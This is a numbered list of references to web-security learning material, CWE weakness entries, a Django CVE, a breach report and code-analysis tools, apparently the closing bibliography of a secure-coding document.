34. PortSwigger Web Security Academy — SQL Injection — https://portswigger.net/web-security/sql-injection
35. PortSwigger Web Security Academy — SSRF — https://portswigger.net/web-security/ssrf
36. PortSwigger Web Security Academy — XXE — https://portswigger.net/web-security/xxe
37. PortSwigger Web Security Academy — Server-Side Template Injection — https://portswigger.net/web-security/server-side-template-injection
38. CVE-2019-19844 — Django password reset email header injection — https://nvd.nist.gov/vuln/detail/CVE-2019-19844
39. Capital One incident postmortem (SSRF + IMDSv1) — https://krebsonsecurity.com/2019/08/capital-one-data-theft-impacts-106m-people/
40. Filippo Valsorda — DNS rebinding research — https://blog.filippo.io/posts/2019-04-09-dns-rebinding-protection/
41. CWE-89 — Improper Neutralization of Special Elements used in an SQL Command — https://cwe.mitre.org/data/definitions/89.html
42. CWE-78 — OS Command Injection — https://cwe.mitre.org/data/definitions/78.html
43. CWE-90 — LDAP Injection — https://cwe.mitre.org/data/definitions/90.html
44. CWE-91 — XML Injection — https://cwe.mitre.org/data/definitions/91.html
45. CWE-94 — Code Injection — https://cwe.mitre.org/data/definitions/94.html
46. CWE-502 — Deserialization of Untrusted Data — https://cwe.mitre.org/data/definitions/502.html
47. CWE-611 — Improper Restriction of XML External Entity Reference — https://cwe.mitre.org/data/definitions/611.html
48. CWE-918 — Server-Side Request Forgery — https://cwe.mitre.org/data/definitions/918.html
49. CWE-1236 — Improper Neutralization of Formula Elements in a CSV File — https://cwe.mitre.org/data/definitions/1236.html
50. CWE-1333 — Inefficient Regular Expression Complexity (ReDoS) — https://cwe.mitre.org/data/definitions/1333.html
51. SecLists payload library — https://github.com/danielmiessler/SecLists
52. Semgrep static analyzer — https://semgrep.dev/
53. CodeQL query language — https://codeql.github.com/
